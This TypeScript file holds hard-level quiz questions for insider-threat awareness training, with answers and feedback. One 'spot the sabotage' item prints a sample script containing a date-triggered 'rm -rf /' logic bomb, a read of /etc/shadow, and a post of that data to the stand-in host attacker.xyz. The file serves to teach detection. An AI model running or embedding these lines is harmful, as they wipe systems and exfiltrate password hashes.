import type { Question } from '../types';

export const hardQuestions: Question[] = [
  {
    id: "insider-hard-1",
    type: "JUDGE",
    topic: "Motivations",
    questionText: "The 'MICE' framework describes the four primary motivations for an insider to betray their organization: Money, Ideology, Coercion, and Ego. Is this true?",
    scenario: {
      body: "SCENARIO: Counter-intelligence officers use this model to profile potential spies or malicious insiders."
    },
    isFake: false,
    feedback: {
      explanation: "MICE is a standard intelligence framework. Money (financial need), Ideology (political/religious), Coercion (blackmail), and Ego (need for recognition) drive most malicious actions.",
      proTip: "Knowing the 'Why' helps HR identify high-risk situations (like an employee going through a bankruptcy or being approached by a competitor).",
      redFlags: ["Financial distress", "Radicalization", "Extreme arrogance/resentment"]
    },
    scoreValue: 10
  },
  {
    id: "insider-hard-2",
    type: "MCQ",
    topic: "Psychological Pathways",
    questionText: "According to the 'Critical Path' model developed by Carnegie Mellon, which event usually triggers the transition from a 'Disgruntled Employee' to an 'Active Threat'?",
    scenario: {
      body: "An employee has been showing negative behavior for months. Suddenly, they commit a major act of sabotage."
    },
    options: [
      { id: "a", key: "A", text: "A technical system failure." },
      { id: "b", key: "B", text: "A specific 'Triggering Event' like a poor performance review, demotion, or denied promotion." },
      { id: "c", key: "C", text: "Installing a new antivirus software." },
      { id: "d", key: "D", text: "Moving to a new office building." }
    ],
    correctOptionId: "b",
    feedback: {
      explanation: "Malicious acts are rarely spontaneous. They are the result of a 'Pathway' where a personal predisposition meets a stressful life event (The Trigger).",
      proTip: "Post-termination and post-demotion are the highest risk periods for sabotage.",
      redFlags: ["Negative performance reviews", "Public humiliation in the office"]
    },
    scoreValue: 10
  },
  {
    id: "insider-hard-3",
    type: "SPOT",
    topic: "Sabotage Detection",
    questionText: "Identify the three malicious elements in this developer's Python script, which was found hidden in the production build folder.",
    scenario: {
      body: "SCRIPT SNIPPET: 1. `import os; import requests`. 2. `if date.today() > date(2025, 1, 1): os.system('rm -rf /')`. 3. `payload = {'data': open('/etc/shadow').read()}`. 4. `requests.post('https://attacker.xyz/leak', data=payload)`."
    },
    redFlags: [
      { id: "rf1", x: 20, y: 30, label: "Logic Bomb", explanation: "The code checks for a specific date (Jan 1, 2025) and then executes a destructive command—this is a 'Logic Bomb'." },
      { id: "rf2", x: 50, y: 70, label: "Sensitive File Access", explanation: "Reading `/etc/shadow` (which contains password hashes) is a clear sign of malicious intent." },
      { id: "rf3", x: 80, y: 20, label: "Exfiltration Path", explanation: "Posting sensitive data to an external, unrecognized domain (`attacker.xyz`) is the final step of data theft." }
    ],
    feedback: {
      explanation: "Technical sabotage often hides in plain sight as 'Maintenance Scripts'. Code review and 'Separation of Duties' are the best defenses.",
      proTip: "Never allow a single developer to push code to production without a second set of eyes (Peer Review).",
      redFlags: ["Hardcoded dates in scripts", "Unauthorized outbound network calls", "Accessing system credentials"]
    },
    scoreValue: 10
  },
  {
    id: "insider-hard-4",
    type: "OPEN_TEXT",
    topic: "Ethics & Privacy",
    questionText: "Discuss the balance between 'Employee Privacy' and 'Insider Threat Monitoring'. What are the legal risks of using keystroke loggers or pervasive screen recording on employee devices?",
    scenario: {
      body: "A company wants to install 'Bossware' to monitor every click of their remote workers."
    },
    feedback: {
      explanation: "Pervasive monitoring can lead to lawsuits under GDPR or local privacy laws. It also destroys trust, which can ironically *create* the disgruntlement that leads to insider threats.",
      proTip: "Use 'Least Invasive' monitoring—focus on system logs and DLP alerts rather than personal screen activity.",
      redFlags: ["Privacy violations", "Loss of employee trust"]
    },
    scoreValue: 10
  },
  {
    id: "insider-hard-5",
    type: "MCQ",
    topic: "UEBA",
    questionText: "What makes 'User and Entity Behavior Analytics' (UEBA) superior to traditional rule-based security (like 'Alert if user downloads > 1GB')?",
    scenario: {
      body: "A sophisticated insider steals data in tiny increments (10MB per day) to avoid hitting hard limits."
    },
    options: [
      { id: "a", key: "A", text: "It is cheaper to install and maintain." },
      { id: "b", key: "B", text: "It uses Machine Learning to establish a 'Baseline' for each user and alerts on 'Anomalies' (changes in behavior), even if no hard rules are broken." },
      { id: "c", key: "C", text: "It automatically fires the employee if they do something wrong." },
      { id: "d", key: "D", text: "It replaces the need for a firewall." }
    ],
    correctOptionId: "b",
    feedback: {
      explanation: "UEBA looks for patterns. If a marketing person suddenly starts using PowerShell, or an accountant logs in from a new country, UEBA flags it as 'Atypical' even if they only touch 1MB of data.",
      proTip: "Context is king. UEBA provides the 'Who, What, Where, When, and How' of an anomaly.",
      redFlags: ["Atypical user activity", "Baseline deviation"]
    },
    scoreValue: 10
  },
  {
    id: "insider-hard-6",
    type: "CLASSIFY",
    topic: "Impact Analysis",
    questionText: "Classify these sophisticated insider attacks based on their primary goal.",
    scenario: {
      body: "Insiders can have very different objectives."
    },
    items: [
      { id: "i1", text: "Diverting small amounts of money from thousands of accounts to a personal one", category: "Fraud" },
      { id: "i2", text: "Stealing the source code for a new AI engine to give to a nation-state", category: "Espionage" },
      { id: "i3", text: "Deleting the only copy of a production database out of anger", category: "Sabotage" },
      { id: "i4", text: "Copying a client list to use at a new job", category: "Theft" },
      { id: "i5", text: "Modifying financial records to hide an existing debt", category: "Fraud" }
    ],
    categories: ["Fraud", "Espionage", "Sabotage", "Theft"],
    feedback: {
      explanation: "Sabotage destroys; Espionage shares; Theft takes; Fraud manipulates. Each requires a different detection strategy.",
      proTip: "Data integrity checks (Hashes) are the best way to detect 'Fraud' and 'Sabotage'.",
      redFlags: ["Unauthorized data modification", "Bulk intellectual property theft"]
    },
    scoreValue: 10
  },
  {
    id: "insider-hard-7",
    type: "OPEN_TEXT",
    topic: "Strategic Defense",
    questionText: "You are the CISO of a high-growth startup. Describe a comprehensive 'Insider Threat Program' that includes Technical, Administrative, and Physical controls. How do you handle 'False Positives'?",
    scenario: {
      body: "Goal: Build a culture of security without creating a 'Big Brother' atmosphere."
    },
    feedback: {
      explanation: "A good program includes: 1. Clear Policies (Admin). 2. UEBA/DLP (Technical). 3. Access Zoning (Physical). Handling False Positives requires a 'Triage' team to investigate alerts before accusing anyone.",
      proTip: "Focus on 'Education and Assistance'. Often, an insider's 'Red Flag' behavior is actually a cry for help or a sign of burnout.",
      redFlags: ["High false positive rates", "Toxic security culture"]
    },
    scoreValue: 10
  }
];
